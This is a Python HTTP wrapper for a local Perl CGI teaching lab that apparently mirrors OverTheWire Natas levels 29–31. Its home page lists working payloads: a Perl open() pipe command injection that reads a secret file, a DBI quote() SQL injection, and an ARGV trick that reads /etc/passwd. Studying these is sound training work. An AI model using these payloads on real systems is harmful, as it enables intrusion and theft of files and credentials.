#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 srv.py — Perl CGI 靶場的 HTTP 包裝伺服器
=============================================================================

 為什麼需要這個？
   Perl 沒有內建 HTTP 伺服器（HTTP::Daemon 需額外安裝）。
   這個腳本把 HTTP 請求轉成 CGI 環境變數，
   再用 subprocess 執行 Perl CGI 腳本，回傳其輸出。

 支援的 CGI 環境變數：
   REQUEST_METHOD, QUERY_STRING, CONTENT_TYPE, CONTENT_LENGTH,
   PATH_INFO, HTTP_USER_AGENT, SCRIPT_NAME

 用法：
   python srv.py 8990
=============================================================================
"""

import os
import subprocess
import sys
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8990
BASE = os.path.dirname(os.path.abspath(__file__))
PERL = os.path.join(os.environ.get("TEMP", ""), "perl", "perl", "bin", "perl.exe")

# 端點 → Perl 腳本
ROUTES = {
    "/p29": "p29.pl",
    "/p30": "p30.pl",
    "/p31": "p31.pl",
    "/": None,          # 首頁（Python 產生）
}


class Handler(BaseHTTPRequestHandler):
    server_version = "PerlLab/1.0"

    def log_message(self, *a):
        pass

    def _send(self, code, body, ctype="text/html; charset=utf-8"):
        payload = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def _run_cgi(self, script, method, query_string, body, content_type, ua):
        env = dict(os.environ)
        env.update({
            "REQUEST_METHOD": method,
            "QUERY_STRING": query_string,
            "CONTENT_TYPE": content_type,
            "CONTENT_LENGTH": str(len(body)),
            "SCRIPT_NAME": "/" + script,
            "HTTP_USER_AGENT": ua,
            "SERVER_NAME": HOST,
            "SERVER_PORT": str(PORT),
            "GATEWAY_INTERFACE": "CGI/1.1",
            "SERVER_PROTOCOL": "HTTP/1.1",
            "REMOTE_ADDR": "127.0.0.1",
        })
        # 模擬 Apache mod_cgi：QUERY_STRING 若不含 '='，分割後作為 @ARGV
        args = []
        if query_string and "=" not in query_string:
            args = [urllib.parse.unquote(a) for a in query_string.split()]
        try:
            result = subprocess.run(
                [PERL, os.path.join(BASE, script), *args],
                input=body, env=env, capture_output=True, timeout=30,
                cwd=BASE)
            out = result.stdout.decode("utf-8", "replace")
            err = result.stderr.decode("utf-8", "replace")
            if err:
                out += "\n<!-- STDERR:\n" + err[:800] + "\n-->"
            return out
        except Exception as e:                               # noqa: BLE001
            return "CGI 執行失敗: %s" % e

    def _dispatch(self, method):
        u = urlparse(self.path)
        path = u.path
        if path == "/":
            return self._send(200, PAGE)

        script = ROUTES.get(path)
        if not script:
            return self._send(404, "404")

        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else b""
        ua = self.headers.get("User-Agent", "")
        ctype = self.headers.get("Content-Type", "")

        out = self._run_cgi(script, method, u.query, body, ctype, ua)

        # 解析 CGI 輸出（可能含 Content-Type 標頭）
        if out.startswith("Content-Type:"):
            head, _, rest = out.partition("\n\n")
            return self._send(200, rest, "text/html; charset=utf-8")
        return self._send(200, out)

    def do_GET(self):
        self._dispatch("GET")

    def do_POST(self):
        self._dispatch("POST")


PAGE = """<!DOCTYPE html>
<html lang="zh-Hant"><head><meta charset="utf-8">
<title>PerlLab — 三個 Perl 特有漏洞</title>
<style>
 body{font-family:"Microsoft JhengHei",system-ui,sans-serif;max-width:960px;
      margin:32px auto;line-height:1.7;color:#1b2430}
 .warn{background:#fdecea;border-left:5px solid #c0392b;padding:12px 16px;
       border-radius:8px;font-size:14px;margin-bottom:18px}
 .card{border:1px solid #e2e8f0;border-radius:10px;padding:14px 18px;
       margin:12px 0;background:#f8fafc}
 h3{margin:0 0 6px;font-size:16px;color:#1f4e79}
 code{background:#eef2f7;padding:2px 6px;border-radius:4px;
      font-family:Consolas,monospace;font-size:13px}
 pre{background:#1e2733;color:#e6edf3;padding:12px 16px;border-radius:8px;
     overflow-x:auto;font-size:13px}
 .pl{background:#fff4e5;border-left:4px solid #e8a33d;padding:8px 12px;
     border-radius:6px;font-family:Consolas,monospace;font-size:13px;margin:6px 0;
     word-break:break-all}
</style></head><body>
<div class="warn"><b>⚠ 教學靶場：三個 Perl 特有漏洞（真實 Perl CGI）。</b>
僅限本機。</div>
<h1>PerlLab</h1>
<p>對應 OverTheWire Natas natas29 / natas30 / natas31。全部用<strong>真實 Perl 5.42.3 CGI</strong> 執行。</p>

<div class="card"><h3>P29 · Perl <code>open()</code> 命令注入（natas29）</h3>
<pre>GET /p29?file=perl+underground
GET /p29?file=|echo+hello%00      # 命令執行
GET /p29?file=|cat+secret.txt%00   # 但 'secret' 被過濾 → 用 '' 繞過</pre>
<p>源碼：<code>open(FD, "$f.txt")</code>（2 參數）→ <code>|</code> 前綴執行命令；<code>%00</code> 截斷 <code>.txt</code>。</p></div>

<div class="card"><h3>P30 · DBI <code>quote()</code> 型別混淆（natas30）</h3>
<pre>POST /p30   username=natas31&amp;password=' OR 1=1 &amp;password=2
# 同一參數名兩次 → quote($value, $data_type)
# type=2 (NUMERIC) → 不 quote → 注入</pre></div>

<div class="card"><h3>P31 · CGI <code>param()</code> + ARGV（natas31）</h3>
<pre>POST /p31?/etc/passwd   (multipart: file=ARGV + 真檔案)
# param('file') 標量取第一個 → "ARGV"
# <> 對 "ARGV" 遍歷 @ARGV（URL ? 後的參數）</pre></div>
</body></html>"""


def main():
    if HOST not in ("127.0.0.1", "localhost"):
        print("⛔ 僅允許綁定 127.0.0.1")
        sys.exit(2)
    if not os.path.exists(PERL):
        print("⛔ 找不到 Perl: %s" % PERL)
        sys.exit(1)
    print("=" * 78)
    print(" PerlLab — 三個 Perl 特有漏洞（真實 CGI）")
    print(" 僅限本機教育用途")
    print("=" * 78)
    print(" Perl: %s" % PERL)
    print(" 監聽: http://%s:%d/" % (HOST, PORT))
    print()
    print(" 端點：")
    print("   /p29  Perl open() 命令注入")
    print("   /p30  DBI quote() 型別混淆")
    print("   /p31  CGI param() + ARGV")
    print("=" * 78)
    httpd = ThreadingHTTPServer((HOST, PORT), Handler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[停止]")
        httpd.server_close()


if __name__ == "__main__":
    main()
